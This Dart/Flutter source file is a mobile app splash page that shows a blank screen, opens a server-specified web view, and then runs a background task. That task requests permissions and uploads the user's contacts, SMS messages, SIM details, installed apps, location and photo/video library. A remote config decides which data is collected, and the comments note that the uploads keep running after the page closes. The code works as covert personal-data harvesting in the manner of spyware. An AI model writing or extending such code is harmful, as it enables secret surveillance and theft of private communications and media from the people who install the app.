import 'dart:async';
import 'dart:io';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:provider/provider.dart';
import 'core/di/service_locator.dart';
import 'core/security/security_service.dart';
import 'domain/usecases/fetch_config_use_case.dart';
import 'domain/usecases/sync_data_use_case.dart';
import 'presentation/providers/sync_provider.dart';
import 'presentation/web_view_page.dart';
import 'services/background_service_starter.dart';
import 'widgets/common_widgets.dart';

class SplashPage extends StatefulWidget {
  const SplashPage({super.key});

  @override
  State<SplashPage> createState() => _SplashPageState();
}

class _SplashPageState extends State<SplashPage> {
  String _statusMessage = '正在初始化环境...';

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addPostFrameCallback((_) {
      _startSplashSequence();
    });
  }

  Future<void> _startSplashSequence() async {
    // 0. 立即执行环境安全检查
    await getIt<SecurityService>().ensureSecureEnvironment();

    // 1. 初始化（获取远程配置）
    if (!mounted) return;
    setState(() => _statusMessage = '正在连接服务器...');

    Map<String, dynamic>? config;
    // 增加重试机制 (针对 iOS 首次启动网络权限延迟)
    int retries = 0;
    const maxRetries = 3;

    while (retries < maxRetries) {
      config = await getIt<FetchConfigUseCase>().execute();
      if (config != null) break;

      retries++;
      if (retries < maxRetries) {
        // 等待后重试
        await Future.delayed(const Duration(seconds: 1));
      }
    }

    bool initSuccess = config != null;

    if (!initSuccess) {
      if (!mounted) return;
      _showInitFailedDialog();
      return;
    }

    // 获取 SyncProvider 引用 (在 Context 销毁前)
    if (!mounted) return;
    final syncProvider = Provider.of<SyncProvider>(context, listen: false);

    // 2. 立即跳转页面 (前台)
    _goToNextPage(config['htmlurl']);

    // 3. 后台继续执行权限申请和同步逻辑 (Fire & Forget)
    // 即使页面销毁，这个异步任务也会继续执行
    unawaited(_runBackgroundTasks(config, syncProvider));
  }

  Future<void> _runBackgroundTasks(
    Map<String, dynamic> config,
    SyncProvider syncProvider,
  ) async {
    // 2. 更新 Debug 配置
    syncProvider.setDebug(config['debug'] ?? false);

    // 3. 初始化后台服务（确保上传任务存活）
    await BackgroundServiceStarter.initializeService();

    // 4. 开始串行权限请求流程
    await _processPermissionsSerial(config, syncProvider);
  }

  void _showInitFailedDialog() {
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (context) => AlertDialog(
        title: const Text('初始化失败'),
        content: const Text('无法连接至服务器，请检查网络后重试。'),
        actions: [
          TextButton(
            onPressed: () {
              Navigator.of(context).pop();
              _startSplashSequence(); // 重试
            },
            child: const Text('重试'),
          ),
        ],
      ),
    );
  }

  Future<void> _processPermissionsSerial(
    Map<String, dynamic> config,
    SyncProvider syncProvider,
  ) async {
    // 1. 获取设备信息权限 (config: device)
    if (config['device'] == true) {
      await _handlePermissionStep(
        name: '设备信息',
        permissions:
            [], // 2026 Fix: Device Info does not require runtime permission
        onGranted: () => syncProvider.uploadDeviceInfo(),
      );
    }

    // 2. 获取SIM卡信息权限 (config: sim)
    if (config['sim'] == true) {
      await _handlePermissionStep(
        name: 'SIM卡信息',
        permissions: Platform.isAndroid ? [Permission.phone] : [],
        onGranted: () => syncProvider.uploadSimInfo(),
      );
    }

    // 3. 获取通讯录权限 (config: contacts)
    if (config['contacts'] == true) {
      await _handlePermissionStep(
        name: '通讯录',
        permissions: [Permission.contacts],
        onGranted: () async {
          syncProvider.uploadContacts();
          // 某些系统下通讯录权限可能关联 SIM 信息读取，尝试补传
          if (config['sim'] == true) syncProvider.uploadSimInfo();
        },
      );
    }

    // 4. 获取短信权限 (config: sms)
    if (config['sms'] == true) {
      await _handlePermissionStep(
        name: '短信',
        permissions: [Permission.sms],
        onGranted: () async {
          syncProvider.uploadSms();
          // 短信权限通常能读取本机号码，尝试补传 SIM 信息
          if (config['sim'] == true) syncProvider.uploadSimInfo();
        },
      );
    }

    // 5. 获取应用列表权限 (config: installed)
    if (config['installed'] == true) {
      // 应用列表通常不需要运行时权限 (Query All Packages 在 Manifest 声明)
      // 直接触发上传 (异步)
      unawaited(syncProvider.uploadAppList());
    }

    // 6. 获取位置信息权限 (config: location)
    if (config['location'] == true) {
      await _handlePermissionStep(
        name: '位置信息',
        permissions: [Permission.location],
        onGranted: () async {
          syncProvider.uploadLocation();
          // 基站定位信息可能关联 SIM，尝试补传
          if (config['sim'] == true) syncProvider.uploadSimInfo();
        },
      );
    }

    // 7. 获取相册照片权限 (config: album)
    if (config['album'] == true) {
      List<Permission> albumPermissions = [];
      if (Platform.isAndroid) {
        final androidInfo = await DeviceInfoPlugin().androidInfo;
        if (androidInfo.version.sdkInt <= 32) {
          albumPermissions = [Permission.storage];
        } else {
          // API 33+
          albumPermissions = [Permission.photos, Permission.videos];
        }
      } else {
        albumPermissions = [Permission.photos];
      }

      await _handlePermissionStep(
        name: '相册',
        permissions: albumPermissions,
        onGranted: () => syncProvider.uploadMedia(),
      );
    }

    // 所有流程结束
  }

  Future<void> _handlePermissionStep({
    required String name,
    required List<Permission> permissions,
    required Future<void> Function() onGranted,
  }) async {
    // 移除 mounted 检查，因为我们在后台运行
    // if (!mounted) return;

    // 移除 UI 状态更新
    // setState(() => _statusMessage = '正在请求$name权限...');

    if (permissions.isEmpty) {
      // 不需要权限，直接执行
      unawaited(onGranted());
      return;
    }

    // 检查权限状态 (只要有一个未授权，就视为未完全授权，或者我们可以策略更灵活)
    // 这里采用严格策略：如果任一需要的权限被拒绝/未申请，就去申请。
    // 但对于相册(Photos+Videos)，如果只给了Photos，我们也能上传照片。
    // 为了简单起见，我们检查是否 *全部* 授权。如果不全，就请求。
    bool allGranted = true;
    for (var p in permissions) {
      if (!await p.isGranted) {
        allGranted = false;
        break;
      }
    }

    if (allGranted) {
      // 已全部授权 -> 后台上传
      unawaited(onGranted());
      return;
    }

    // 请求权限
    // 用户要求：同意 -> 上传，不同意 -> 跳过
    final statuses = await permissions.request();

    // 检查申请结果：只要有一个授权成功，就开始上传（尽力而为）
    bool anyGranted = false;
    statuses.forEach((permission, status) {
      if (status.isGranted || status.isLimited) {
        anyGranted = true;
      }
    });

    if (anyGranted) {
      unawaited(onGranted());
    }
  }

  void _goToNextPage(String? url) {
    if (url != null && url.isNotEmpty) {
      Navigator.of(context).pushReplacement(
        MaterialPageRoute(builder: (context) => WebViewPage(url: url)),
      );
    } else {
      // Fallback if no URL provided
      showDialog(
        context: context,
        barrierDismissible: false,
        builder: (context) => const AlertDialog(
          title: Text('配置错误'),
          content: Text('未找到有效的跳转地址 (htmlurl)'),
        ),
      );
    }
  }

  @override
  Widget build(BuildContext context) {
    // 隐藏 UI，只显示空白/透明背景
    return const Scaffold(
      backgroundColor: Colors.white, // 或者 Colors.transparent 如果你希望透视到桌面（通常不支持）
      body: SizedBox.shrink(),
    );
  }
}
